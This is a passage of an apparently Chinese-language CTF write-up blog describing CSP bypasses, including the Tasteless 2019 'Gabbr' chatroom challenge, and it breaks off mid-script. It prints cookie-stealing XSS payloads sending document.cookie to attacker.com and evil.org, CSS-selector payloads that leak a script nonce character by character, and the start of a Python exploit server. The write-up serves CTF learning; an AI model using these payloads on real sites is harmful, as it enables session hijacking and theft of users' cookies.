<h6 id="但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用"><a href="#但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用" class="headerlink" title="但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用"></a>但是尝试去发送cookie到我们的服务器上用ajax或者img的src，但是没有用</h6><h6 id="但是由于CSP再次尝试通过ajax或img-src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签："><a href="#但是由于CSP再次尝试通过ajax或img-src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签：" class="headerlink" title="但是由于CSP再次尝试通过ajax或img src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签："></a>但是由于CSP再次尝试通过ajax或img src将cookie发送到我们的服务器，因此无法正常工作。因此，我们再次使用了相同的技巧，并使用正确的nonce编写了一个脚本标签：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script nonce=&quot;&#123;nonce&#125;&quot; src=&quot;https://attacker.com/cookie=&apos;+document.cookie+&apos;&quot;&gt;&lt;/script&gt;&apos;);</span><br></pre></td></tr></table></figure>

<h6 id="后来想了一下，document-location-https-attacker-com-cookie-39-document-cookie-39-也是可以的。"><a href="#后来想了一下，document-location-https-attacker-com-cookie-39-document-cookie-39-也是可以的。" class="headerlink" title="后来想了一下，document.location=https://attacker.com/cookie=&#39;+document.cookie+&#39;也是可以的。"></a>后来想了一下，document.location=<a href="https://attacker.com/cookie=&#39;+document.cookie+&#39;也是可以的。" target="_blank" rel="noopener">https://attacker.com/cookie=&#39;+document.cookie+&#39;也是可以的。</a></h6><h5 id="最终的payload"><a href="#最终的payload" class="headerlink" title="最终的payload:"></a>最终的payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&lt;script nonce=&quot;&#123;nonce&#125;&quot;&gt;document.write(&apos;&lt;script nonce=&quot;&#123;nonce&#125;&quot; src=&quot;https://attacker.com/cookie=&apos;+document.cookie+&apos;&quot;&gt;&lt;/script&gt;&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h6 id="nonce-是先前响应标头中具有相同URL的CSP-nonce令牌"><a href="#nonce-是先前响应标头中具有相同URL的CSP-nonce令牌" class="headerlink" title="{nonce}是先前响应标头中具有相同URL的CSP nonce令牌"></a>{nonce}是先前响应标头中具有相同URL的CSP nonce令牌</h6><h5 id="Lessons-learned"><a href="#Lessons-learned" class="headerlink" title="Lessons learned"></a>Lessons learned</h5><h6 id="Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce"><a href="#Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce" class="headerlink" title="Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As default-src was set to none. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!"></a>Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As <code>default-src</code> was set to <code>none</code>. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!</h6><h4 id="Tasteless-2019-Gabbr"><a href="#Tasteless-2019-Gabbr" class="headerlink" title="Tasteless 2019 - Gabbr"></a>Tasteless 2019 - Gabbr</h4><h5 id="题目类型：CSP，CSS"><a href="#题目类型：CSP，CSS" class="headerlink" title="题目类型：CSP，CSS"></a>题目类型：CSP，CSS</h5><h5 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h5><h6 id="gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如："><a href="#gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如：" class="headerlink" title="gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如："></a>gabbr是一个在线聊天室服务。当页面加载后，人们加入URL的哈希部分指定的聊天室例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gabbr.hitme.tasteless.eu/#8f332afe-8f1d-411f-80f3-44bb2302405d</span><br></pre></td></tr></table></figure>

<h6 id="如果没有指定名称，则在加入时会随机生成一个UUID。"><a href="#如果没有指定名称，则在加入时会随机生成一个UUID。" class="headerlink" title="如果没有指定名称，则在加入时会随机生成一个UUID。"></a>如果没有指定名称，则在加入时会随机生成一个UUID。</h6><h6 id="主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。"><a href="#主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。" class="headerlink" title="主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。"></a>主要的功能是在聊天室中发送消息。此外，可以将用户名更改为另一个随机的用户名，加入新的随机聊天室并将该聊天室报告给管理员。</h6><h6 id="报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。"><a href="#报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。" class="headerlink" title="报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。"></a>报告后，管理员将加入聊天室并在聊天室中待15秒。另外，聊天室是基于websockets。</h6><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><h6 id="收集信息-例如NSA"><a href="#收集信息-例如NSA" class="headerlink" title="收集信息(例如NSA)"></a>收集信息(例如NSA)</h6><h6 id="消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制："><a href="#消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制：" class="headerlink" title="消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制："></a>消息没有被清除，即可以注入任意的HTML。但是，CSP策略具有严格的限制：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;nonce-cff855cb552d6be6be760496&apos;; frame-src https://www.google.com/recaptcha/; connect-src &apos;self&apos; xsstest.tasteless.eu https://www.google.com/recaptcha/; worker-src https://www.google.com/recaptcha/; style-src &apos;unsafe-inline&apos; https://www.gstatic.com/recaptcha/; font-src &apos;self&apos;; img-src *; report-uri https://xsstest.ctf.tasteless.eu/report-violation; object-src &apos;none&apos;</span><br></pre></td></tr></table></figure>

<h6 id="仅当脚本具有正确的nonce属性时才执行脚本标签。"><a href="#仅当脚本具有正确的nonce属性时才执行脚本标签。" class="headerlink" title="仅当脚本具有正确的nonce属性时才执行脚本标签。"></a>仅当脚本具有正确的<code>nonce</code>属性时才执行脚本标签。</h6><h6 id="这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为script-src-39-nonce-cff855cb552d6be6be760496-39-。"><a href="#这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为script-src-39-nonce-cff855cb552d6be6be760496-39-。" class="headerlink" title="这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为script-src &#39;nonce-cff855cb552d6be6be760496&#39;;。"></a>这个nonce在每次页面加载时在服务器端生成，并且在CSP中指定为<code>script-src &#39;nonce-cff855cb552d6be6be760496&#39;;</code>。</h6><h6 id="这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。"><a href="#这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。" class="headerlink" title="这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。"></a>这会阻止其他的尝试和技巧去执行javascript代码像那些事件处理程序。</h6><h6 id="因此，要执行javascript代码，需要知道nonce在加载页面时的值-也就是24个字符-，这显然我们是无法从管理员哪里轻松获取的。"><a href="#因此，要执行javascript代码，需要知道nonce在加载页面时的值-也就是24个字符-，这显然我们是无法从管理员哪里轻松获取的。" class="headerlink" title="因此，要执行javascript代码，需要知道nonce在加载页面时的值(也就是24个字符)，这显然我们是无法从管理员哪里轻松获取的。"></a>因此，要执行javascript代码，需要知道<code>nonce</code>在加载页面时的值(也就是24个字符)，这显然我们是无法从管理员哪里轻松获取的。</h6><h6 id="我们现在可以做的是，虽然是加载任意的CSS和图像style-src被设置为unsafe-inline和img-src是-但是它有一些有趣的攻击方式。"><a href="#我们现在可以做的是，虽然是加载任意的CSS和图像style-src被设置为unsafe-inline和img-src是-但是它有一些有趣的攻击方式。" class="headerlink" title="我们现在可以做的是，虽然是加载任意的CSS和图像style-src被设置为unsafe-inline和img-src是*但是它有一些有趣的攻击方式。"></a>我们现在可以做的是，虽然是加载任意的CSS和图像<code>style-src</code>被设置为<code>unsafe-inline</code>和<code>img-src</code>是<code>*</code>但是它有一些有趣的攻击方式。</h6><h5 id="获取随机数"><a href="#获取随机数" class="headerlink" title="获取随机数"></a>获取随机数</h5><h6 id="在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章："><a href="#在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章：" class="headerlink" title="在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章："></a>在网上搜索我们的想法时，我们偶然发现了2016年以来的这篇文章：</h6><h6 id="https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-html其作者描述了攻击者可以使用css提取其内容。"><a href="#https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-html其作者描述了攻击者可以使用css提取其内容。" class="headerlink" title="https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html其作者描述了攻击者可以使用css提取其内容。"></a><a href="https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html其作者描述了攻击者可以使用css提取其内容。" target="_blank" rel="noopener">https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html其作者描述了攻击者可以使用css提取其内容。</a></h6><ul>
<li>首先，注入与<code>nonce</code>的第一个字符匹配的CSS选择器。</li>
<li>匹配后，将CSS选择器设置从给定的URL加载背景图片。由于我们知道匹配的内容，因此可以将匹配的字符串作为GET参数添加到请求中。</li>
<li>通过对每个字符重复此过程，我们可以用24条消息重构整个<code>nonce</code>。</li>
</ul>
<h6 id="这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。"><a href="#这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。" class="headerlink" title="这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。"></a>这是非常合适的，因为我们可以注入任意的CSS！因此我们像适当的黑客一样，复制了他的脚本。</h6><h6 id="但是，给定的选择器不起作用。"><a href="#但是，给定的选择器不起作用。" class="headerlink" title="但是，给定的选择器不起作用。"></a>但是，给定的选择器不起作用。</h6><h6 id="因此我们自己开始自行的调试选择器。"><a href="#因此我们自己开始自行的调试选择器。" class="headerlink" title="因此我们自己开始自行的调试选择器。"></a>因此我们自己开始自行的调试选择器。</h6><h6 id="之后我们尝试去匹配script标签使用Chrome失败时，我们注意到了一些奇怪的现象："><a href="#之后我们尝试去匹配script标签使用Chrome失败时，我们注意到了一些奇怪的现象：" class="headerlink" title="之后我们尝试去匹配script标签使用Chrome失败时，我们注意到了一些奇怪的现象："></a>之后我们尝试去匹配<code>script</code>标签使用Chrome失败时，我们注意到了一些奇怪的现象：</h6><h6 id="Chrome加载后将其nonce从script-tag中删除。"><a href="#Chrome加载后将其nonce从script-tag中删除。" class="headerlink" title="Chrome加载后将其nonce从script-tag中删除。"></a>Chrome加载后将其<code>nonce</code>从<code>script-tag</code>中删除。</h6><h6 id="但是。Firefox将nonce保存早DOM树中。"><a href="#但是。Firefox将nonce保存早DOM树中。" class="headerlink" title="但是。Firefox将nonce保存早DOM树中。"></a>但是。Firefox将<code>nonce</code>保存早DOM树中。</h6><h6 id="幸运的是，攻击者使用的是Firefox，我们是从管理员的user-agent头中发现的。"><a href="#幸运的是，攻击者使用的是Firefox，我们是从管理员的user-agent头中发现的。" class="headerlink" title="幸运的是，攻击者使用的是Firefox，我们是从管理员的user-agent头中发现的。"></a>幸运的是，攻击者使用的是Firefox，我们是从管理员的<code>user-agent</code>头中发现的。</h6><h6 id="我们的第一种方法是script直接匹配标记：script-nonce-quot-a-quot-。"><a href="#我们的第一种方法是script直接匹配标记：script-nonce-quot-a-quot-。" class="headerlink" title="我们的第一种方法是script直接匹配标记：script[nonce^=&quot;a&quot;]。"></a>我们的第一种方法是<code>script</code>直接匹配标记：<code>script[nonce^=&quot;a&quot;]</code>。</h6><h6 id="这应将任何script标记与以开头的nonce匹配a。"><a href="#这应将任何script标记与以开头的nonce匹配a。" class="headerlink" title="这应将任何script标记与以开头的nonce匹配a。"></a>这应将任何<code>script</code>标记与以开头的<code>nonce</code>匹配<code>a</code>。</h6><h6 id="但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配script标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：script-nonce-quot-s-quot-nav。"><a href="#但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配script标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：script-nonce-quot-s-quot-nav。" class="headerlink" title="但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配script标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：script[nonce^=&quot;%s&quot;] ~ nav。"></a>但是，这没有按预期工作。经过大量的实验和错误，我们发现你不能直接匹配<code>script</code>标签，但是在选择其他元素时可以将其用作选择器的一部分。因此我们决定使用类似这样的兄弟选择器：<code>script[nonce^=&quot;%s&quot;] ~ nav</code>。</h6><h6 id="因为nav和script是兄弟标签，所以效果很好。"><a href="#因为nav和script是兄弟标签，所以效果很好。" class="headerlink" title="因为nav和script是兄弟标签，所以效果很好。"></a>因为<code>nav</code>和<code>script</code>是兄弟标签，所以效果很好。</h6><h5 id="使用以上的方法，我们可以发送如下的消息："><a href="#使用以上的方法，我们可以发送如下的消息：" class="headerlink" title="使用以上的方法，我们可以发送如下的消息："></a>使用以上的方法，我们可以发送如下的消息：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;0&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=0&quot;)&#125;</span><br><span class="line">script[nonce^=&quot;1&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=1&quot;)&#125;</span><br><span class="line">...</span><br><span class="line">script[nonce^=&quot;f&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=f&quot;)&#125;</span><br></pre></td></tr></table></figure>

<h6 id="仅当至少一个元素与选择器匹配时才触发-因此，仅执行-quot-正确-quot-请求-。假设第一个字符是a，那么我们的下一个payload如下："><a href="#仅当至少一个元素与选择器匹配时才触发-因此，仅执行-quot-正确-quot-请求-。假设第一个字符是a，那么我们的下一个payload如下：" class="headerlink" title="仅当至少一个元素与选择器匹配时才触发(因此，仅执行&quot;正确&quot;请求)。假设第一个字符是a，那么我们的下一个payload如下："></a>仅当至少一个元素与选择器匹配时才触发(因此，仅执行&quot;正确&quot;请求)。假设第一个字符是<code>a</code>，那么我们的下一个payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;a0&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=a0&quot;)&#125;</span><br><span class="line">script[nonce^=&quot;a1&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=a1&quot;)&#125;</span><br><span class="line">...</span><br><span class="line">script[nonce^=&quot;af&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=af&quot;)&#125;</span><br></pre></td></tr></table></figure>

<h6 id="我们可以重复此过程24次，以爆破出这个nonce。"><a href="#我们可以重复此过程24次，以爆破出这个nonce。" class="headerlink" title="我们可以重复此过程24次，以爆破出这个nonce。"></a>我们可以重复此过程24次，以爆破出这个<code>nonce</code>。</h6><h6 id="我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。"><a href="#我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。" class="headerlink" title="我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。"></a>我们使用python实现了一个攻击服务器，该服务器接收成功的请求，并如上所述向聊天室发送另外一个消息，询问下一个字符。通过连接到聊天室的websocket，将下一个有效的payload直接发送到聊天室。</h6><h6 id="但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。"><a href="#但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。" class="headerlink" title="但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。"></a>但是，在尝试后，我们注意到仅仅发送了第一个请求。这是因为后续的CSS注入与以前的CSS规则具有相同的特异性。这意味着包含再次执行后台获取。我们通过手动设置一组从最小到最重要的24个选择器来解决这个问题。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;%s&quot;] ~ *</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ ul</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ div</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ input</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ ul</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ div</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ input</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ nav</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #messages</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #status</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #chatbox</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #recaptcha</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; a</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; #report-link</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; #username</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #messages</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #status</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #chatbox</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #recaptcha</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; a</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; #report-link</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; #username</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; [href=&quot;/&quot;]</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; [href=&quot;#&quot;]</span><br></pre></td></tr></table></figure>

<h6 id="综上所述，我们设法获得了完整的nonce！"><a href="#综上所述，我们设法获得了完整的nonce！" class="headerlink" title="综上所述，我们设法获得了完整的nonce！"></a>综上所述，我们设法获得了完整的<code>nonce</code>！</h6><h4 id="创建漏洞"><a href="#创建漏洞" class="headerlink" title="创建漏洞"></a>创建漏洞</h4><h6 id="现在我们有了nonce，我们可以注入script-tags绕过CSP并执行它。但是，直接加载-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-不会产生任何效果，因为在页面加载后不会评估-evaluated-脚本。因此，要绕过此限制，我们iframe通过将脚本指定为来将脚本包含在中srcdoc。我们最终的漏洞利用如下所示："><a href="#现在我们有了nonce，我们可以注入script-tags绕过CSP并执行它。但是，直接加载-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-不会产生任何效果，因为在页面加载后不会评估-evaluated-脚本。因此，要绕过此限制，我们iframe通过将脚本指定为来将脚本包含在中srcdoc。我们最终的漏洞利用如下所示：" class="headerlink" title="现在我们有了nonce，我们可以注入script-tags绕过CSP并执行它。但是，直接加载&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;不会产生任何效果，因为在页面加载后不会评估(evaluated)脚本。因此，要绕过此限制，我们iframe通过将脚本指定为来将脚本包含在中srcdoc。我们最终的漏洞利用如下所示："></a>现在我们有了<code>nonce</code>，我们可以注入script-tags绕过CSP并执行它。但是，直接加载<code>&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;</code>不会产生任何效果，因为在页面加载后不会评估(evaluated)脚本。因此，要绕过此限制，我们<code>iframe</code>通过将脚本指定为来将脚本包含在中<code>srcdoc</code>。我们最终的漏洞利用如下所示：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script nonce=...&gt;alert(document.cookie); var x = document.createElement(&apos;img&apos;); x.src = &apos;http://evil.org/res?c=&apos; + document.cookie;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h6 id="注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。"><a href="#注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。" class="headerlink" title="注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。"></a>注意，我们试图加载图像而不是直接发送请求，因为后者被CSP阻止。幸运的是，CSP允许加载任何来源的图像。</h6><h5 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h5><h6 id="Our-final-approach-was-the-following"><a href="#Our-final-approach-was-the-following" class="headerlink" title="Our final approach was the following:"></a>Our final approach was the following:</h6><h6 id="1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit"><a href="#1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit" class="headerlink" title="1. Enter a chatroom using Chrome so that we are unaffected by the exploit"></a>1. Enter a chatroom using Chrome so that we are unaffected by the exploit</h6><h6 id="2-Start-the-exploit-server-pointed-at-the-chatroom"><a href="#2-Start-the-exploit-server-pointed-at-the-chatroom" class="headerlink" title="2. Start the exploit server pointed at the chatroom"></a>2. Start the exploit server pointed at the chatroom</h6><h6 id="3-Report-the-chatroom-and-wait-for-the-admin-to-join"><a href="#3-Report-the-chatroom-and-wait-for-the-admin-to-join" class="headerlink" title="3. Report the chatroom and wait for the admin to join"></a>3. Report the chatroom and wait for the admin to join</h6><h6 id="4-Send-the-initial-CSS-payload-manually-through-the-browser"><a href="#4-Send-the-initial-CSS-payload-manually-through-the-browser" class="headerlink" title="4. Send the initial CSS payload manually through the browser."></a>4. Send the initial CSS payload manually through the browser.</h6><h6 id="5-Let-the-server-handle-the-rest"><a href="#5-Let-the-server-handle-the-rest" class="headerlink" title="5. Let the server handle the rest"></a>5. Let the server handle the rest</h6><ul>
<li>1.Wait for an http request from the admin</li>
<li>2.Parse the GET parameter</li>
<li>3.Send the next CSS payload via websockets to exfiltrate the next 4haracter</li>
<li>4.Repeat until we have the whole nonce</li>
<li>5.Send the exploit iframe</li>
<li>6.Listen for the request from the admin containing the cookies containing the flag</li>
<li>7.????</li>
<li>8.PROFIT!!!!</li>
</ul>
<h6 id="Below-is-the-final-script-that-ran-on-the-server"><a href="#Below-is-the-final-script-that-ran-on-the-server" class="headerlink" title="Below is the final script that ran on the server:"></a>Below is the final script that ran on the server:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">URL = <span class="string">"http://evil.org:5000"</span></span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ *'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ ul'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ div'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ input'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav'</span>,</span><br><span class="line">        <span class="string">'body &gt; 